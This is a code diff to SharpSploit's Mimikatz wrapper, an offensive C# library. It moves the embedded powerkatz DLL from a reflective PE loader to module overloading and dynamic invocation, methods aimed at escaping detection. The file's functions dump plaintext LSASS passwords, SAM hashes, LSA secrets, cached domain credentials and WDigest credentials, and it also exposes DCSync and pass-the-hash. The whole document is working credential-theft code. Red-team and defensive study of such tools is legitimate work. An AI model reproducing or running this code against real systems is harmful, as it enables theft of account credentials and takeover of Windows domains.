+++ SharpSploit/Credentials/Mimikatz.cs
@@ -9,8 +9,7 @@ using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 
 using SharpSploit.Misc;
-using SharpSploit.Execution;
-using PInvoke = SharpSploit.Execution.PlatformInvoke;
+using SharpSploit.Execution.ManualMap;
 
 namespace SharpSploit.Credentials
 {
@@ -22,63 +21,71 @@ namespace SharpSploit.Credentials
     /// <remarks>
     /// Mimikatz is a tool for playing with credentials in Windows, written by Benjamin Delpy (@gentilkiwi). (Found
     /// at https://github.com/gentilkiwi/mimikatz).
-    /// SharpSploit's PE Loader is adapted from work by Casey Smith (@subtee). (No longer available at original location.)
-    /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation. (Found
-    /// at https://github.com/xorrior/Random-CSharpTools/tree/master/DllLoader/DllLoader)
+    /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation, converted by (@TheRealWover) to use the Manual Mapping API.
     /// </remarks>
     public class Mimikatz
     {
         private static byte[] PEBytes32 { get; set; }
         private static byte[] PEBytes64 { get; set; }
 
-        private static PE MimikatzPE { get; set; } = null;
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate IntPtr MimikatzType(IntPtr command);
+        private static PE.PE_MANUAL_MAP MimikatzPE = new PE.PE_MANUAL_MAP();
+        private static bool MappedMimikatz = false;
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
+        private delegate string MimikatzType(string command);
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes a chosen Mimikatz command.
+        /// Loads the Mimikatz PE and executes a chosen Mimikatz command.
         /// </summary>
         /// <param name="Command">Mimikatz command to be executed.</param>
         /// <returns>Mimikatz output.</returns>
         public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords")
         {
-            // Console.WriteLine(String.Join(",", System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames()));
-            if (MimikatzPE == null)
+            string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
+
+            try
             {
-                string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
-                if (IntPtr.Size == 4 && MimikatzPE == null)
+                if (IntPtr.Size == 4 && !MappedMimikatz)
                 {
                     if (PEBytes32 == null)
                     {
                         PEBytes32 = Utilities.GetEmbeddedResourceBytes("powerkatz_x86.dll");
                         if (PEBytes32 == null) { return ""; }
                     }
-                    MimikatzPE = PE.Load(PEBytes32);
+
+                    MimikatzPE = Overload.OverloadModule(PEBytes32);
+                    MappedMimikatz = true;
                 }
-                else if (IntPtr.Size == 8 && MimikatzPE == null)
+                else if (IntPtr.Size == 8)
                 {
-                    if (PEBytes64 == null)
+                    if (PEBytes64 == null && !MappedMimikatz)
                     {
                         PEBytes64 = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.dll");
                         if (PEBytes64 == null) { return ""; }
                     }
-                    MimikatzPE = PE.Load(PEBytes64);
+
+                    MimikatzPE = Overload.OverloadModule(PEBytes64);
+                    MappedMimikatz = true;
                 }
             }
-            if (MimikatzPE == null) { return ""; }
-            IntPtr functionPointer = MimikatzPE.GetFunctionExport("powershell_reflective_mimikatz");
-            if (functionPointer == IntPtr.Zero) { return ""; }
+            catch (Exception ex)
+            {
+                return ex.Message;
+            }
 
-            MimikatzType mimikatz = (MimikatzType) Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(MimikatzType));
-            IntPtr input = Marshal.StringToHGlobalUni(Command);
             try
             {
-                IntPtr output = IntPtr.Zero;
+                string output = "";
                 Thread t = new Thread(() =>
                 {
                     try
                     {
-                        output = mimikatz(input);
+                        object[] parameters =
+                        {
+                            Command
+                        };
+
+                        output = (string)Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(MimikatzPE.PEINFO, MimikatzPE.ModuleBase, "powershell_reflective_mimikatz", typeof(MimikatzType), parameters);
                     }
                     catch (Exception e)
                     {
@@ -87,14 +94,7 @@ namespace SharpSploit.Credentials
                 });
                 t.Start();
                 t.Join();
-                Marshal.FreeHGlobal(input);
-                if (output == IntPtr.Zero)
-                {
-                    return "";
-                }
-                string stroutput = Marshal.PtrToStringUni(output);
-                PInvoke.Win32.Kernel32.LocalFree(output);
-                return stroutput;
+                return output;
             }
             catch (Exception e)
             {
@@ -104,27 +104,37 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatzcommand to retrieve plaintext
+        /// Loads the Mimikatz PE and executes the Mimikatz command to get some coffee.
+        /// Equates to `Command("coffee")`.
+        /// </summary>
+        /// <returns>Mimikatz output.</returns>
+        public static string Coffee()
+        {
+            return Command("coffee");
+        }
+
+        /// <summary>
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve plaintext
         /// passwords from LSASS. Equates to `Command("privilege::debug sekurlsa::logonPasswords")`. (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
         public static string LogonPasswords()
-		{
-			return Command("privilege::debug sekurlsa::logonPasswords");
-		}
+        {
+            return Command("privilege::debug sekurlsa::logonPasswords");
+        }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve password hashes
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve password hashes
         /// from the SAM database. Equates to `Command("privilege::debug lsadump::sam")`. (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
 		public static string SamDump()
         {
-			return Command("token::elevate lsadump::sam");
+            return Command("token::elevate lsadump::sam");
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve LSA secrets
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve LSA secrets
         /// stored in registry. Equates to `Command("privilege::debug lsadump::secrets")`. (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
@@ -134,7 +144,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Domain
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Domain
         /// Cached Credentials hashes from registry. Equates to `Command("privilege::debug lsadump::cache")`.
         /// (Requires Admin)
         /// </summary>
@@ -145,7 +155,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Wdigest
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Wdigest
         /// credentials from registry. Equates to `Command("sekurlsa::wdigest")`.
         /// </summary>
         /// <returns>Mimikatz output.</returns>
@@ -155,22 +165,22 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes each of the builtin local commands (not DCSync). (Requires Admin)
+        /// Loads the Mimikatz PE and executes each of the builtin local commands (not DCSync). (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
 		public static string All()
         {
-			StringBuilder builder = new StringBuilder();
-			builder.AppendLine(LogonPasswords());
-			builder.AppendLine(SamDump());
-			builder.AppendLine(LsaSecrets());
-			builder.AppendLine(LsaCache());
-			builder.AppendLine(Wdigest());
-			return builder.ToString();
+            StringBuilder builder = new StringBuilder();
+            builder.AppendLine(LogonPasswords());
+            builder.AppendLine(SamDump());
+            builder.AppendLine(LsaSecrets());
+            builder.AppendLine(LsaCache());
+            builder.AppendLine(Wdigest());
+            return builder.ToString();
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
+        /// Loads the Mimikatz PE and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
         /// </summary>
         /// <param name="user">Username to retrieve NTLM hash for. "All" for all domain users.</param>
         /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
@@ -206,7 +216,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the "pth" module to start a new process
+        /// Loads the Mimikatz PE and executes the "pth" module to start a new process
         /// as a user using an NTLM password hash for authentication.
         /// </summary>
         /// <param name="user">Username to authenticate as.</param>